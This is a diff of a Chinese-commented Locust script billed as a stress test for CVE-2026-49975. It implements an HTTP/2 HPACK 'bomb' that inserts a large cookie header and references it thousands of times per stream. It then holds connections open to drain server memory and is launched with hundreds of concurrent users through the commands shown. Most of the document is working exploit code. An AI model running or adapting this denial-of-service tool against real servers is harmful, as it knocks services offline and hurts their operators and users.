@@ -10,11 +10,11 @@ CVE-2026-49975 专用压测脚本
   locust -f locustfile.py --host https://your-target.com \
     --headless -u 100 -r 100 --run-time 5m
 
-  # 500 个并发线程，跑 10 分钟（内存消耗更大）
+  # 500 个并发线程，跑 10 分钟
   locust -f locustfile.py --host https://your-target.com \
     --headless -u 500 -r 500 --run-time 10m
 
-环境变量控制（可选）：
+环境变量控制：
   LOCUST_REFERENCES    : 每个流的 HPACK 引用次数 (默认 2048)
   LOCUST_HOLD_SECONDS  : 每个炸弹连接保持秒数 (默认 15)
   LOCUST_STREAMS       : 每个连接的并发流数 (默认 1)
@@ -73,9 +73,7 @@ def build_headers_frame(stream_id: int, indexed_references: int = 2048) -> bytes
     """
     name = b"cookie"
     value = b"a" * 255
-    # Literal Header Field with Incremental Indexing
     insert_prefix = bytes([0x40, len(name)]) + name + bytes([len(value)]) + value
-    # Indexed Header Field — 假设动态表索引为 62
     indexed_ref = bytes([0xBE])
     payload = insert_prefix + indexed_ref * indexed_references
     return build_frame(HEADERS_FRAME_TYPE, 0x04 | 0x01, stream_id, payload)
@@ -91,9 +89,8 @@ class Http2BombUser(User):
     持续建立连接 → 发送炸弹 payload → 保持连接不释放
     """
 
-    wait_time = constant(0)  # 一个连接结束后立即建立下一个
+    wait_time = constant(0)
 
-    # 从环境变量读取参数
     references_per_stream = REFERENCES
     streams_per_connection = STREAMS
     hold_seconds = HOLD_SECONDS
@@ -139,20 +136,26 @@ class Http2BombUser(User):
     @task
     def http2_bomb_attack(self):
         """
-        执行一次 HTTP/2 HPACK 炸弹攻击：
-        1. 建立 TCP + TLS 连接
-        2. 发送 HTTP/2 前言 + SETTINGS（关闭流量控制窗口）
-        3. 发送 HPACK 炸弹 HEADERS 帧
-        4. 保持连接存活，阻止服务端释放内存
+        执行一次 HTTP/2 HPACK 炸弹攻击，并手动上报统计。
         """
         hostname, port, use_tls = self._parse_host()
         sock = None
+        start_time = time.time()
+        request_meta = {
+            "request_type": "H2-BOMB",
+            "name": f"/ (refs={self.references_per_stream}, hold={self.hold_seconds}s)",
+            "start_time": start_time,
+            "response_length": 0,
+            "response": None,
+            "context": {},
+            "exception": None,
+        }
 
         try:
             # ---- 1. TCP 连接 ----
             sock = socket.create_connection((hostname, port), timeout=10.0)
 
-            # ---- 2. TLS 握手（如果需要）----
+            # ---- 2. TLS 握手 ----
             if use_tls:
                 sock = self._get_ssl_ctx().wrap_socket(sock, server_hostname=hostname)
 
@@ -165,7 +168,7 @@ class Http2BombUser(User):
                 frame = build_headers_frame(sid, self.references_per_stream)
                 sock.sendall(frame)
 
-            # ---- 5. 保持连接存活，阻止内存释放 ----
+            # ---- 5. 保持连接存活 ----
             if self.hold_seconds > 0:
                 end_time = time.time() + self.hold_seconds
                 while time.time() < end_time:
@@ -175,18 +178,34 @@ class Http2BombUser(User):
                         if not data:
                             break
                     except socket.timeout:
-                        continue  # 超时正常，继续等待
+                        continue
                     except OSError:
                         break
 
+            # 成功
+            request_meta["response_length"] = 0
+            request_meta["response"] = None
+
         except Exception as e:
-            logger.debug(f"Bomb attack failed: {e}")
+            request_meta["exception"] = e
+
         finally:
             if sock:
                 try:
                     sock.close()
                 except Exception:
                     pass
+
+            # ===== 手动上报请求统计到 Locust =====
+            total_time = int((time.time() - start_time) * 1000)
+            request_meta["response_time"] = total_time
+
+            if request_meta["exception"]:
+                # 上报失败
+                events.request_failure.fire(**request_meta)
+            else:
+                # 上报成功
+                events.request_success.fire(**request_meta)
 
 
 # ============================================================
